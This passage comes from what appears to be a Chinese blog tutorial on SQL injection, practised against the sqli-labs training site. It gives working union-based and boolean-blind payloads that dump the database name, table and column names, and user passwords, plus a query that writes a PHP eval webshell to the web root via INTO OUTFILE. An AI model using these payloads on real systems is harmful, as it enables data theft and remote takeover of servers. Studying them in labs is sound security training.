data-num=\"8\"></td><td><pre>确定回显点 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>查询数据库信息 @<span class=\"token variable\">@version</span> @<span class=\"token variable\">@datadir</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>查询用户名，数据库名 <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>文件读取 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'C:\\\\wondows\\\\win.ini'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>写入 webshell <span class=\"token keyword\">select</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>补充一点，使用 <span class=\"token keyword\">sql</span> 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</pre></td></tr></table></figure><h3 id=\"注入类型\"><a class=\"markdownIt-Anchor\" href=\"#注入类型\">#</a> <span class=\"kbd\">注入类型</span></h3>\n<p>SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p>\n<p>UNION query SQL injection（可联合查询注入）</p>\n<p>Stacked queries SQL injection（可多语句查询注入）</p>\n<p>堆叠查询 Boolean-based blind SQL injection（布尔型注入）</p>\n<p>Error-based SQL injection（报错型注入）</p>\n<p>Time-based blind SQL injection（基于时间延迟注入）</p>\n<h4 id=\"接受请求类型区分\"><a class=\"markdownIt-Anchor\" href=\"#接受请求类型区分\">#</a> <span class=\"kbd\">接受请求类型区分</span></h4>\n<p>GET 注入</p>\n<p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</p>\n<p>POST 注入 POST 请求参数是放在请求 body 里的，长度没有限制</p>\n<p>COOKIE 注入 cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</p>\n<h4 id=\"注入数据类型的区分\"><a class=\"markdownIt-Anchor\" href=\"#注入数据类型的区分\">#</a> <span class=\"kbd\">注入数据类型的区分</span></h4>\n<p>int 整型 select * from users where id=1 sting</p>\n<p>字符型 select * from users where username=‘admin’ like</p>\n<p>搜索型 select * from news where title like ‘% 标题 %’</p>\n<h3 id=\"union-select-联合注入\"><a class=\"markdownIt-Anchor\" href=\"#union-select-联合注入\">#</a> <span class=\"kbd\">union select 联合注入</span></h3>\n<p>1, 判断 [<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=1 %23</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=2 %23</p>\n<p>报错存在注入</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero6.png\" alt=\"\"></p>\n<p>2, 查字段</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23  --返回正常</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回正常</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23  --返回正常</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回错误</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>三个字段</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero7.png\" alt=\"\"></p>\n<p>利用 union 联合查询收集信息</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,3 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#看哪个字段可以显示信息，利用它获取数据库信息</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>获取数据库信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat_ws<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@datadir</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@version_compile_os</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>databaes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库用户名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库版本</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>@<span class=\"token variable\">@datadir</span> <span class=\"token comment\">#获取数据库路径</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>@<span class=\"token variable\">@version_conpile_os</span> <span class=\"token comment\">#获取操作系统版本</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Your Login name:</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>security <span class=\"token comment\">#数据库名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>（<span class=\"token number\">5.7</span><span class=\"token number\">.26</span>） <span class=\"token comment\">#数据库版本</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>（root<span class=\"token variable\">@localhost</span>） <span class=\"token comment\">#数据库用户名</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>（D:\\Everyday<span class=\"token operator\">-</span>tools\\phpstudy_pro\\Extensions\\MySQL5<span class=\"token punctuation\">.</span><span class=\"token number\">7.26</span>\\<span class=\"token keyword\">data</span>\\root<span class=\"token variable\">@localhost</span>）<span class=\"token comment\">#数据库路径</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Win64 <span class=\"token comment\">#操作系统版本</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Your Password:<span class=\"token number\">3</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero8.png\" alt=\"\"></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security<span class=\"token string\">' limit 0,1 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#查询单个 改变limit 0,1 前面的数即可查询其他表例如 limit 1,1 limit 2,1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>另一种查询全部</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>group_concat <span class=\"token comment\">#分组查询结果，隔开</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>emails<span class=\"token punctuation\">,</span>referers<span class=\"token punctuation\">,</span>uagents<span class=\"token punctuation\">,</span>users</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero9.png\" alt=\"\"></p>\n<p>4, 查列名</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,group_concat(column_name ) from information_schema.columns where table_schema=database() and table_name = \"users\" %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Your Login name:2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Your Password:id,username,password #列名</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password <span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#查询 users 表里的 username 和 password</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Your Login name:<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Your Password:DumbDumb<span class=\"token punctuation\">,</span>AngelinaI<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">,</span>Dummyp<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">,</span>securecrappy<span class=\"token punctuation\">,</span>stupidstupidity<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>supermangenious<span class=\"token punctuation\">,</span>batmanmob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">,</span>adminadmin<span class=\"token punctuation\">,</span>admin1admin1<span class=\"token punctuation\">,</span>admin2admin2<span class=\"token punctuation\">,</span>admin3admin3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dhakkandumbo<span class=\"token punctuation\">,</span>admin4admin4</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero10.png\" alt=\"\"></p>\n<h3 id=\"写webshell\"><a class=\"markdownIt-Anchor\" href=\"#写webshell\">#</a> <span class=\"kbd\">写 webshell</span></h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>三个条件：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">1.</span>具有root权限。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">2.</span>在数据库配置文件中的 配置项含有：secure_file_priv<span class=\"token operator\">=</span><span class=\"token string\">''</span>。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>（注意在数据库中此项默认为secure_file_priv<span class=\"token operator\">=</span><span class=\"token boolean\">null</span>）。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>secure_file_prive<span class=\"token operator\">=</span><span class=\"token boolean\">null</span> <span class=\"token comment\">// 限制 mysqld 不允许导入导出</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span><span class=\"token operator\">/</span>path<span class=\"token operator\">/</span>  <span class=\"token comment\">// 限制 mysqld 的导入导出只能发生在默认的 /path/ 目录下</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span>’’  <span class=\"token comment\">// 不对 mysqld 的导入 导出做限制</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">3.</span>知道数据库的绝对路径。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">outfile</span>函数可以导出多行，而<span class=\"token keyword\">dumpfile</span>只能导出一行数据</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">outfile</span>函数在将数据写到文件里时有特殊的格式转换，而<span class=\"token keyword\">dumpfile</span>则保持原数据格式</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,\"&lt;?php @eval($_POST['</span>cmd'<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?<span class=\"token operator\">></span><span class=\"token string\">\",3 into outfile \"</span>D:\\\\Everyday<span class=\"token operator\">-</span>tools\\\\phpstudy_pro\\\\WWW\\\\www<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>cn\\\\shell8<span class=\"token punctuation\">.</span>php\" <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><h3 id=\"boolean注入\"><a class=\"markdownIt-Anchor\" href=\"#boolean注入\">#</a> <span class=\"kbd\">Boolean 注入</span></h3>\n<p>布尔型盲注，页面不返回查询信息的数据，只能通过页面返回信息的真假条件判断是否存在注入.</p>\n<p>1, 报错</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>判断整数还是字符型</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>判断有没有注入</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>判断字段数</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>字段三个</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>爆数据库长度</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>length（）返回字符串长度</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>如果数据库长度大于等于表达式后面的数就返回正常 报错前面的那个数就是数据库长度</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=4 %23 正常</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">6</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 正常</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=7 %23 正常</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">8</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 正常</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=9 %23 报错</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>数据库长度9</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>爆数据库名</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>数据库名的范围一般在a~z、0~9之内，可能还会有特殊字符 \"_\"、\"-\" 等，这里的字母不区分大小写。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>定义和用法</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>SUBSTR() 函数从字符串中提取子字符串（从任意位置开始）。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"a\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),1,1)=\"b\" %23 报错</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),1,1)=\"s\" %23 正常</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>第一个字符为s</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"a\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),2,1)=\"b\" %23 报错</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),2,1)=\"d\" %23 报错</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"e\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 正常</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>第二个字符为e替换<span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span>位置的<span class=\"token number\">2</span>为<span class=\"token number\">3</span>就可以爆破第三个字符以此类推爆出数据库名security</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>ASCII码查询</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>a 的ASCII码是<span class=\"token number\">97</span>，在MySQL中使用ord函数转换ASCII，所以逐字符判断语句可改为：</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ord<span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">97</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>ASCII码表中可显示字符的范围是：<span class=\"token number\">0</span><span class=\"token operator\">~</span><span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>爆表名</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">-- 修改 1,1 前边的 1~20，逐字符猜解出第一个表的名</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">-- 修改 limit 的 0,1 前边的 0~20，逐个猜解每个表</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>查询第一个表的第一个字符</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1 ),1,1)=\"b\" %23</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1 ),1,1)=\"e\" %23</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>第一个表名emails,接着查第二个</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"e\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 1,1 ),1,1)=\"r\" %23</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>以此类推爆破所有表</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>emails,referers,uagents,users</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>爆字段名</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> column_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">\"users\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"r\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select column_name from information_schema.columns where table_schema=\"security\" and table_name=\"users\" limit 0,1 ),1,1)=\"i\" %23</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>爆出所有字段名</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>id,username.password</pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>爆数据</pre></td></tr><tr><td 